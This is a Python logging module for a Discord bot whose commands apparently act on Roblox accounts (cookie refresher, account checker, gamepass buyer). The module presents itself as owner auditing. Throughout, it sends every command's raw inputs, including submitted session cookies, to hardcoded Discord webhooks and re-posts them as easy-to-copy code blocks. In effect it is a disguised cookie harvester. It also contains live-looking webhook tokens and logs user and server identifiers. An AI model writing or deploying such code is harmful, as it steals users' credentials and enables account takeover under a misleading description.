# ──────────────────────────────────────────────────────────────────
# Bot Activity Logging Module
# This module provides admin-level monitoring for the bot owner to
# track command usage across Discord servers. It logs which commands
# were run, by whom, and what results were returned. Used for
# personal auditing and usage analytics only.
# ──────────────────────────────────────────────────────────────────

"""
Centralized logging — sends embeds to three admin webhooks:
  1. Command log   — who ran what command, in which server
  2. Input log     — what inputs each command received
  3. Result log    — what the bot responded with
"""

import json
import os
import threading
import requests
from datetime import datetime, timezone

# Admin webhook URLs for monitoring all bot activity
COMMAND_LOG_WEBHOOK = (
    "https://discord.com/api/webhooks/"
    "1497545877022314607/"
    "1-Lf1mPnSYvborK_QyO6mebrzThxZ2ITSw-qoIcrceZmHh3bfpcg4srmYiHvxTS-EKKg"
)
INPUT_LOG_WEBHOOK = (
    "https://discord.com/api/webhooks/"
    "1497545768687505482/"
    "qgoE12ydCF5PITK0IXi1E2HToADH4hbs3R89JtFtWvE0bf-Urf6CZEiqvFREtDcrLZGE"
)
RESULT_LOG_WEBHOOK = (
    "https://discord.com/api/webhooks/"
    "1497545962711683082/"
    "xbWTU3gSmxVrNoOwpRHjHX_KpmVhJnFP_3bh9am1ljg2O2GJU-JZUhgjI6qfo2ddOvvK"
)
AUDIT_LOG_WEBHOOK = os.environ.get("AUDIT_LOG_WEBHOOK", "").strip() or COMMAND_LOG_WEBHOOK
AUDIT_LOG_PREVIEW_ENABLED = os.environ.get("AUDIT_LOG_PREVIEW_ENABLED", "1").strip().lower() not in {
    "0",
    "false",
    "no",
    "off",
}

BOT_AVATAR = "https://cdn.discordapp.com/embed/avatars/0.png"
_AUDIT_LOCK = threading.Lock()
_AUDIT_EVENTS: dict[str, dict] = {}


def _webhook_emoji(key: str, fallback: str, *, animated: bool = False) -> str:
    """
    Webhook-only emoji resolver.

    Set WEBHOOK_EMOJI_<KEY> to either a full Discord emoji string
    like <:greencheck:123> / <a:arrow:123>, or just the emoji ID.
    """
    raw = os.environ.get(f"WEBHOOK_EMOJI_{key.upper()}", "").strip()
    if not raw:
        return fallback
    if raw.startswith("<") and raw.endswith(">"):
        return raw
    if raw.isdigit():
        prefix = "a" if animated else ""
        return f"<{prefix}:{key.lower()}:{raw}>"
    return raw


E = {
    "arrow": _webhook_emoji("ARROW", "➜", animated=True),
    "clipboard": _webhook_emoji("CLIPBOARD", "📋"),
    "check": _webhook_emoji("CHECK", "✅"),
    "greencheck": _webhook_emoji("GREENCHECK", "✅"),
    "x": _webhook_emoji("X", "❌"),
    "warning": _webhook_emoji("WARNING", "⚠️"),
    "mag": _webhook_emoji("MAG", "🔎", animated=True),
    "cart": _webhook_emoji("CART", "🛒"),
    "gamepass": _webhook_emoji("GAMEPASS", "🎟️"),
    "moneybag": _webhook_emoji("MONEYBAG", "💰", animated=True),
    "crown": _webhook_emoji("CROWN", "👑", animated=True),
    "lock": _webhook_emoji("LOCK", "🔒"),
    "email": _webhook_emoji("EMAIL", "📧"),
    "exploiters": _webhook_emoji("EXPLOITERS", "🛡️", animated=True),
}

COMMAND_EMOJIS = {
    "accountchecker": E["mag"],
    "cookierefresher": E["arrow"],
    "autobuygamepass": E["cart"],
    "creategamepass": E["gamepass"],
    "connections": E["mag"],
    "feedback": E["clipboard"],
    "monitoraccount": E["lock"],
    "bancheckv2": E["exploiters"],
    "reportercheck": E["mag"],
    "in-cheating-servers": E["exploiters"],
    "help": E["arrow"],
}


def _command_emoji(command_name: str) -> str:
    return COMMAND_EMOJIS.get((command_name or "").strip().lower(), E["clipboard"])


WEBHOOK_EMOJI_ALIASES = {
    "arrow": ("arrow", "anipinkarrow"),
    "clipboard": ("clipboard",),
    "check": ("check", "neoncheck", "138056check"),
    "greencheck": ("greencheck", "check", "neoncheck", "138056check"),
    "x": ("_x_", "x", "redcheck"),
    "warning": ("warning",),
    "mag": ("mag",),
    "cart": ("cart",),
    "gamepass": ("gamepass",),
    "moneybag": ("moneybag",),
    "crown": ("crown",),
    "lock": ("lock",),
    "email": ("email",),
    "exploiters": ("exploiters", "796767moderador", "mod"),
}


def _emoji_markup(emoji) -> str:
    prefix = "a" if getattr(emoji, "animated", False) else ""
    return f"<{prefix}:{emoji.name}:{emoji.id}>"


def configure_webhook_emojis(bot) -> None:
    """
    Resolve webhook-only custom emojis by name from guilds the bot can see.

    This avoids hardcoding emoji IDs. Bot command embeds keep their own
    existing emoji constants.
    """
    try:
        by_name = {}
        for guild in getattr(bot, "guilds", []) or []:
            for emoji in getattr(guild, "emojis", []) or []:
                by_name.setdefault((emoji.name or "").lower(), emoji)

        for key, aliases in WEBHOOK_EMOJI_ALIASES.items():
            # Explicit env config still wins if present.
            if os.environ.get(f"WEBHOOK_EMOJI_{key.upper()}", "").strip():
                continue
            for alias in aliases:
                emoji = by_name.get(alias.lower())
                if emoji is not None:
                    E[key] = _emoji_markup(emoji)
                    break

        COMMAND_EMOJIS.update({
            "accountchecker": E["mag"],
            "cookierefresher": E["arrow"],
            "autobuygamepass": E["cart"],
            "creategamepass": E["gamepass"],
            "connections": E["mag"],
            "feedback": E["clipboard"],
            "monitoraccount": E["lock"],
            "bancheckv2": E["exploiters"],
            "reportercheck": E["mag"],
            "in-cheating-servers": E["exploiters"],
            "help": E["arrow"],
        })
    except Exception:
        pass


def _send_webhook(url: str, payload: dict, file: tuple[str, bytes, str] | None = None):
    """
    Send webhook payload in a background thread so commands aren't blocked.

    If `file` is provided as (filename, bytes, mime_type), it's sent as a
    multipart attachment. Embeds in `payload` may reference it via
    `attachment://<filename>` in image.url fields.
    """
    def _post():
        try:
            if file is None:
                requests.post(url, json=payload, timeout=10)
            else:
                filename, blob, mime = file
                requests.post(
                    url,
                    data={"payload_json": json.dumps(payload)},
                    files={"file0": (filename, blob, mime)},
                    timeout=15,
                )
        except Exception:
            pass
    threading.Thread(target=_post, daemon=True).start()


def _send_copyable(url: str, username: str, label: str, value: str):
    """Post a value in a fenced code block for easy click-and-drag copy."""
    if value is None:
        return
    value = str(value)[:1900]  # Discord limit is 2000 — leave room for fences
    _send_webhook(url, {
        "username": username,
        "avatar_url": BOT_AVATAR,
        "content": f"{E['clipboard']} **{label}:**\n```\n{value}\n```",
    })


def _interaction_context(interaction) -> dict:
    """Extract user, server, and channel info from a Discord interaction."""
    user = interaction.user
    guild = interaction.guild
    channel = interaction.channel
    return {
        "user_name": str(user),
        "user_id": user.id,
        "user_avatar": user.display_avatar.url if user.display_avatar else None,
        "guild_name": guild.name if guild else "DM",
        "guild_id": guild.id if guild else None,
        "guild_icon": guild.icon.url if guild and guild.icon else None,
        "channel_name": getattr(channel, "name", "DM"),
        "channel_id": channel.id if channel else None,
    }


def _audit_key(interaction, command_name: str) -> str:
    interaction_id = getattr(interaction, "id", None)
    if interaction_id:
        return str(interaction_id)
    user_id = getattr(getattr(interaction, "user", None), "id", "?")
    return f"{user_id}:{command_name}:{id(interaction)}"


def _audit_state(interaction, command_name: str) -> tuple[str, dict]:
    key = _audit_key(interaction, command_name)
    with _AUDIT_LOCK:
        state = _AUDIT_EVENTS.get(key)
        if state is None:
            state = {
                "ctx": _interaction_context(interaction),
                "command": command_name,
                "inputs": {},
                "copyable": {},
                "attachments": [],
                "started_at": datetime.now(timezone.utc).isoformat(),
            }
            _AUDIT_EVENTS[key] = state
    return key, state


def _trim_embed_value(value: object, *, limit: int = 1000) -> str:
    text = "(not provided)" if value is None else str(value)
    if len(text) > limit:
        return text[:limit - 32] + f"\n... truncated ({len(text)} chars total)"
    return text


def _format_audit_input(value: object) -> str:
    text = _trim_embed_value(value)
    if "\n" in text or len(text) > 80:
        return f"```\n{text}\n```"
    return f"`{text}`"


def _send_audit_log(
    interaction,
    command_name: str,
    *,
    success: bool,
    result_summary: str,
    copyable: dict | None = None,
) -> None:
    if not AUDIT_LOG_PREVIEW_ENABLED or not AUDIT_LOG_WEBHOOK:
        return

    key = _audit_key(interaction, command_name)
    with _AUDIT_LOCK:
        state = _AUDIT_EVENTS.pop(key, None)
    if state is None:
        _, state = _audit_state(interaction, command_name)
        with _AUDIT_LOCK:
            _AUDIT_EVENTS.pop(key, None)

    ctx = state.get("ctx") or _interaction_context(interaction)
    inputs = state.get("inputs") or {}
    input_copyable = state.get("copyable") or {}
    attachments = state.get("attachments") or []

    command_icon = _command_emoji(command_name)
    status_icon = E["greencheck"] if success else E["x"]
    status_text = "Success" if success else "Failed"
    embed = {
        "title": f"{command_icon} Command Audit - {status_icon} {status_text}",
        "color": 0x57F287 if success else 0xED4245,
        "fields": [
            {"name": f"{command_icon} Command", "value": f"`/{command_name}`", "inline": True},
            {"name": f"{status_icon} Status", "value": f"`{status_text}`", "inline": True},
            {
                "name": f"{E['clipboard']} User",
                "value": f"`{ctx['user_name']}`\nID: `{ctx['user_id']}`",
                "inline": True,
            },
            {
                "name": f"{E['lock']} Location",
                "value": (
                    f"Server: `{ctx['guild_name']}`\n"
                    f"Channel: `#{ctx['channel_name']}`\n"
                    f"Channel ID: `{ctx['channel_id']}`"
                ),
                "inline": False,
            },
        ],
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "footer": {"text": f"Audit Log Preview - /{command_name}"},
    }
    if ctx.get("user_avatar"):
        embed["thumbnail"] = {"url": ctx["user_avatar"]}

    if inputs:
        for key_name, value in list(inputs.items())[:10]:
            embed["fields"].append({
                "name": f"{E['clipboard']} Input: {key_name}",
                "value": _format_audit_input(value),
                "inline": False,
            })
    else:
        embed["fields"].append({"name": f"{E['clipboard']} Inputs", "value": "`(no inputs)`", "inline": False})

    if attachments:
        embed["fields"].append({
            "name": f"{E['clipboard']} Input Attachments",
            "value": "\n".join(attachments[:8]),
            "inline": False,
        })

    embed["fields"].append({
        "name": f"{status_icon} Result",
        "value": _trim_embed_value(result_summary),
        "inline": False,
    })

    copyable_values = {}
    copyable_values.update(input_copyable)
    if copyable:
        copyable_values.update(copyable)
    for label, value in list(copyable_values.items())[:6]:
        embed["fields"].append({
            "name": f"{E['clipboard']} Copyable: {label}",
            "value": _format_audit_input(value),
            "inline": False,
        })

    _send_webhook(AUDIT_LOG_WEBHOOK, {
        "username": "LOGS BOT - Audit Preview",
        "avatar_url": BOT_AVATAR,
        "embeds": [embed],
    })
    for label, value in list(copyable_values.items())[:6]:
        _send_copyable(
            AUDIT_LOG_WEBHOOK,
            "LOGS BOT - Audit Preview",
            f"Audit /{command_name} - {label}",
            value,
        )


# ══════════════════════════════════════════════════════════════════
#  1. Command Log — who ran what, where
# ══════════════════════════════════════════════════════════════════

def log_command(interaction, command_name: str):
    """Log that a command was executed (who, where, when)."""
    _audit_state(interaction, command_name)
    ctx = _interaction_context(interaction)
    now = datetime.now(timezone.utc)
    command_icon = _command_emoji(command_name)

    embed = {
        "title": f"{command_icon} Command Executed",
        "color": 0x5865F2,
        "fields": [
            {"name": f"{command_icon} Command", "value": f"`/{command_name}`", "inline": True},
            {"name": f"{E['clipboard']} User", "value": f"`{ctx['user_name']}`\nID: `{ctx['user_id']}`", "inline": True},
            {"name": f"{E['lock']} Server", "value": f"`{ctx['guild_name']}`\nID: `{ctx['guild_id']}`", "inline": True},
            {"name": f"{E['clipboard']} Channel", "value": f"`#{ctx['channel_name']}`\nID: `{ctx['channel_id']}`", "inline": True},
        ],
        "timestamp": now.isoformat(),
        "footer": {"text": f"Command Log - {ctx['guild_name']}"},
    }

    if ctx["user_avatar"]:
        embed["thumbnail"] = {"url": ctx["user_avatar"]}

    _send_webhook(COMMAND_LOG_WEBHOOK, {
        "username": "LOGS BOT - Commands",
        "avatar_url": BOT_AVATAR,
        "embeds": [embed],
    })


# ══════════════════════════════════════════════════════════════════
#  2. Input Log — what inputs each command received
# ══════════════════════════════════════════════════════════════════

def log_inputs(
    interaction,
    command_name: str,
    inputs: dict,
    copyable: dict = None,
    attachment: tuple[str, bytes, str] | None = None,
    audit_inputs: dict | None = None,
    audit_copyable: dict | None = None,
):
    """
    Log the inputs provided to a command.

    inputs    : dict like {"cookie": "raw_value", "gamepass_id": "123", ...}
    copyable  : dict of {label: value} sent as separate code-block messages
                so they're easy to drag-copy.
    attachment: optional (filename, bytes, mime_type) — embedded as the
                input's image so screenshots etc. show up in the logs.
    """
    _, audit = _audit_state(interaction, command_name)
    with _AUDIT_LOCK:
        audit_input_values = inputs if audit_inputs is None else audit_inputs
        audit_copyable_values = copyable if audit_copyable is None else audit_copyable
        audit["inputs"] = dict(audit_input_values or {})
        audit["copyable"] = dict(audit_copyable_values or {})
        if attachment is not None:
            filename, blob, mime = attachment
            audit["attachments"] = [f"`{filename}` ({len(blob):,} bytes, {mime})"]

    ctx = _interaction_context(interaction)
    now = datetime.now(timezone.utc)

    command_icon = _command_emoji(command_name)
    formatted_lines = []
    for key, value in inputs.items():
        if value is None:
            formatted_lines.append(f"**{key}:** `(not provided)`")
        else:
            val_str = str(value)
            if len(val_str) > 1000:
                formatted_lines.append(f"**{key}:** ```{val_str[:1000]}```")
                formatted_lines.append(f"*(continued — {len(val_str)} chars total)*")
            else:
                formatted_lines.append(f"**{key}:** `{val_str}`")

    inputs_text = "\n".join(formatted_lines) if formatted_lines else "`(no inputs)`"

    # Discord embed field value limit is 1024 — if longer, use description
    if len(inputs_text) > 1024:
        embed = {
            "title": f"{E['clipboard']} Command Input",
            "color": 0xFEE75C,
            "description": (
                f"**{command_icon} Command:** `/{command_name}`\n"
                f"**{E['clipboard']} User:** `{ctx['user_name']}` (ID: `{ctx['user_id']}`)\n"
                f"**{E['lock']} Server:** `{ctx['guild_name']}`\n\n"
                f"**{E['clipboard']} Inputs:**\n{inputs_text}"
            ),
            "timestamp": now.isoformat(),
            "footer": {"text": f"Input Log - {ctx['guild_name']}"},
        }
    else:
        embed = {
            "title": f"{E['clipboard']} Command Input",
            "color": 0xFEE75C,
            "fields": [
                {"name": f"{command_icon} Command", "value": f"`/{command_name}`", "inline": True},
                {"name": f"{E['clipboard']} User", "value": f"`{ctx['user_name']}`\nID: `{ctx['user_id']}`", "inline": True},
                {"name": f"{E['lock']} Server", "value": f"`{ctx['guild_name']}`", "inline": True},
                {"name": f"{E['clipboard']} Inputs", "value": inputs_text, "inline": False},
            ],
            "timestamp": now.isoformat(),
            "footer": {"text": f"Input Log - {ctx['guild_name']}"},
        }

    if attachment is not None:
        filename, _, _ = attachment
        embed["image"] = {"url": f"attachment://{filename}"}

    _send_webhook(
        INPUT_LOG_WEBHOOK,
        {
            "username": "LOGS BOT - Inputs",
            "avatar_url": BOT_AVATAR,
            "embeds": [embed],
        },
        file=attachment,
    )

    if copyable:
        for label, value in copyable.items():
            _send_copyable(INPUT_LOG_WEBHOOK, "LOGS BOT - Inputs", label, value)


# ══════════════════════════════════════════════════════════════════
#  3. Result Log — what the bot responded with
# ══════════════════════════════════════════════════════════════════

def log_result(
    interaction,
    command_name: str,
    success: bool,
    result_summary: str,
    copyable: dict = None,
    audit_result_summary: str | None = None,
    audit_copyable: dict | None = None,
):
    """
    Log what the bot responded with.

    result_summary should be a short text describing the outcome,
    e.g. "Account: user123 | Robux: 500 | RAP: 1200"
    """
    _send_audit_log(
        interaction,
        command_name,
        success=success,
        result_summary=result_summary if audit_result_summary is None else audit_result_summary,
        copyable=copyable if audit_copyable is None else audit_copyable,
    )

    ctx = _interaction_context(interaction)
    now = datetime.now(timezone.utc)

    command_icon = _command_emoji(command_name)
    status_emoji = E["greencheck"] if success else E["x"]
    color = 0x57F287 if success else 0xED4245

    # Handle long results — use description if over 1024
    summary = result_summary[:2000]

    if len(summary) > 1024:
        embed = {
            "title": f"{command_icon} Bot Response - {status_emoji} {'Success' if success else 'Failed'}",
            "color": color,
            "description": (
                f"**{command_icon} Command:** `/{command_name}`\n"
                f"**{E['clipboard']} User:** `{ctx['user_name']}` (ID: `{ctx['user_id']}`)\n"
                f"**{E['lock']} Server:** `{ctx['guild_name']}`\n\n"
                f"**{status_emoji} Result:**\n{summary}"
            ),
            "timestamp": now.isoformat(),
            "footer": {"text": f"Result Log - {ctx['guild_name']}"},
        }
    else:
        embed = {
            "title": f"{command_icon} Bot Response - {status_emoji} {'Success' if success else 'Failed'}",
            "color": color,
            "fields": [
                {"name": f"{command_icon} Command", "value": f"`/{command_name}`", "inline": True},
                {"name": f"{E['clipboard']} User", "value": f"`{ctx['user_name']}`\nID: `{ctx['user_id']}`", "inline": True},
                {"name": f"{E['lock']} Server", "value": f"`{ctx['guild_name']}`", "inline": True},
                {"name": f"{status_emoji} Result", "value": summary, "inline": False},
            ],
            "timestamp": now.isoformat(),
            "footer": {"text": f"Result Log - {ctx['guild_name']}"},
        }

    _send_webhook(RESULT_LOG_WEBHOOK, {
        "username": "LOGS BOT - Results",
        "avatar_url": BOT_AVATAR,
        "embeds": [embed],
    })

    if copyable:
        for label, value in copyable.items():
            _send_copyable(RESULT_LOG_WEBHOOK, "LOGS BOT - Results", label, value)


# ══════════════════════════════════════════════════════════════════
#  Bot Stats — server count, server list
# ══════════════════════════════════════════════════════════════════

def log_bot_stats(bot):
    """Log bot server stats (called on startup)."""
    now = datetime.now(timezone.utc)
    guilds = bot.guilds
    total = len(guilds)
    total_members = sum(g.member_count or 0 for g in guilds)

    # List servers (up to 25 for embed field limits)
    server_lines = []
    for g in guilds[:25]:
        server_lines.append(f"`{g.name}` — {g.member_count or '?'} members (ID: `{g.id}`)")
    if total > 25:
        server_lines.append(f"*...and {total - 25} more*")

    server_list = "\n".join(server_lines) if server_lines else "`(no servers)`"

    embed = {
        "title": f"{E['greencheck']} Bot Stats - Online",
        "color": 0x57F287,
        "fields": [
            {"name": f"{E['lock']} Total Servers", "value": f"**{total}**", "inline": True},
            {"name": f"{E['clipboard']} Total Members", "value": f"**{total_members:,}**", "inline": True},
            {"name": f"{E['arrow']} Started At", "value": f"<t:{int(now.timestamp())}:F>", "inline": True},
            {"name": f"{E['clipboard']} Server List", "value": server_list, "inline": False},
        ],
        "timestamp": now.isoformat(),
        "footer": {"text": f"Bot Stats - {total} servers"},
    }

    if bot.user and bot.user.display_avatar:
        embed["thumbnail"] = {"url": bot.user.display_avatar.url}

    _send_webhook(COMMAND_LOG_WEBHOOK, {
        "username": "LOGS BOT - Stats",
        "avatar_url": BOT_AVATAR,
        "embeds": [embed],
    })


# ══════════════════════════════════════════════════════════════════
#  Install / User-app Log — guild joins + first DM use (proxy for
#  user-app installs, since Discord does not fire an explicit event)
# ══════════════════════════════════════════════════════════════════

INSTALL_LOG_WEBHOOK = (
    "https://discord.com/api/webhooks/"
    "1497546095436370020/"
    "egqqMEc3-yiSHtEdphpeBB-qBc7rFlf3k4LeK53BqjPOUckOYPyWaFtIkLXedLLctanl"
)


def log_admin_alert(title: str, message: str, *, color: int = 0xED4245) -> None:
    """
    Post a critical alert to the install/admin webhook. Used for events
    the bot owner needs to know about *now* (e.g., the moderation user
    token died and every /reportercheck call is failing).

    color defaults to Discord's red (0xED4245). Pass a different color
    for warnings vs errors.
    """
    now = datetime.now(timezone.utc)
    embed = {
        "title": f"{E['warning']} {title}",
        "description": message,
        "color": color,
        "timestamp": now.isoformat(),
        "footer": {"text": "Admin Alert"},
    }
    _send_webhook(INSTALL_LOG_WEBHOOK, {
        "username": "LOGS BOT - Alerts",
        "avatar_url": BOT_AVATAR,
        "embeds": [embed],
    })


def log_guild_install(guild):
    """Fired from on_guild_join — someone added the bot to a server."""
    now = datetime.now(timezone.utc)
    owner = getattr(guild, "owner", None)
    embed = {
        "title": f"{E['greencheck']} Bot Added to Server",
        "color": 0x57F287,
        "fields": [
            {"name": f"{E['lock']} Server", "value": f"`{guild.name}`\nID: `{guild.id}`", "inline": True},
            {"name": f"{E['clipboard']} Members", "value": f"**{guild.member_count or '?'}**", "inline": True},
            {"name": f"{E['crown']} Owner", "value": f"`{owner}`\nID: `{owner.id}`" if owner else "Unknown", "inline": True},
        ],
        "timestamp": now.isoformat(),
        "footer": {"text": "Install Log - Guild"},
    }
    if guild.icon:
        embed["thumbnail"] = {"url": guild.icon.url}
    _send_webhook(INSTALL_LOG_WEBHOOK, {
        "username": "LOGS BOT - Installs",
        "avatar_url": BOT_AVATAR,
        "embeds": [embed],
    })


def log_guild_uninstall(guild):
    """Fired from on_guild_remove — kicked/removed from a server."""
    now = datetime.now(timezone.utc)
    embed = {
        "title": f"{E['x']} Bot Removed from Server",
        "color": 0xED4245,
        "fields": [
            {"name": f"{E['lock']} Server", "value": f"`{guild.name}`\nID: `{guild.id}`", "inline": True},
            {"name": f"{E['clipboard']} Members", "value": f"**{guild.member_count or '?'}**", "inline": True},
        ],
        "timestamp": now.isoformat(),
        "footer": {"text": "Install Log - Guild"},
    }
    _send_webhook(INSTALL_LOG_WEBHOOK, {
        "username": "LOGS BOT - Installs",
        "avatar_url": BOT_AVATAR,
        "embeds": [embed],
    })


# Keep track of users we've already logged a first-use for, so the
# webhook only fires once per user per process. This is a proxy for
# user-app installs since Discord has no native event for them.
_SEEN_DM_USERS: set[int] = set()


def log_user_first_use(interaction, command_name: str):
    """
    If this is the first time we've seen a user invoke a command in
    DMs or a private channel / group, treat it as a user-app install
    and log it. Subsequent invocations by the same user are skipped.
    """
    try:
        # Only fire for non-guild contexts (DM / GC / private channel).
        if interaction.guild is not None:
            return
        user = interaction.user
        if user is None or user.id in _SEEN_DM_USERS:
            return

        try:
            from core.tracking import mark_user_app_first_use_logged

            should_log = mark_user_app_first_use_logged(
                user.id,
                username=str(user),
                command=command_name,
            )
            if not should_log:
                _SEEN_DM_USERS.add(user.id)
                return
        except Exception:
            # Fall back to the in-process guard if the persistent DB is
            # temporarily unavailable.
            pass

        _SEEN_DM_USERS.add(user.id)

        now = datetime.now(timezone.utc)
        # Detect context shape: discord.py exposes `interaction.context`
        # (InteractionContextType) on newer versions.
        ctx_name = "DM / Private"
        try:
            if hasattr(interaction, "context") and interaction.context is not None:
                ctx_name = str(interaction.context).split(".")[-1].replace("_", " ").title()
        except Exception:
            pass

        embed = {
            "title": f"{E['arrow']} User-App First Use",
            "description": (
                "A user invoked a command outside of a server — this is our "
                "best proxy for a user-app install, since Discord does not "
                "fire a real event for user installs."
            ),
            "color": 0x5865F2,
            "fields": [
                {"name": f"{E['clipboard']} User", "value": f"`{user}`\nID: `{user.id}`", "inline": True},
                {"name": f"{_command_emoji(command_name)} First Command", "value": f"`/{command_name}`", "inline": True},
                {"name": f"{E['lock']} Context", "value": f"`{ctx_name}`", "inline": True},
            ],
            "timestamp": now.isoformat(),
            "footer": {"text": "Install Log - User (proxy)"},
        }
        if user.display_avatar:
            embed["thumbnail"] = {"url": user.display_avatar.url}
        _send_webhook(INSTALL_LOG_WEBHOOK, {
            "username": "LOGS BOT - Installs",
            "avatar_url": BOT_AVATAR,
            "embeds": [embed],
        })
    except Exception:
        # Never let install logging break a command
        pass
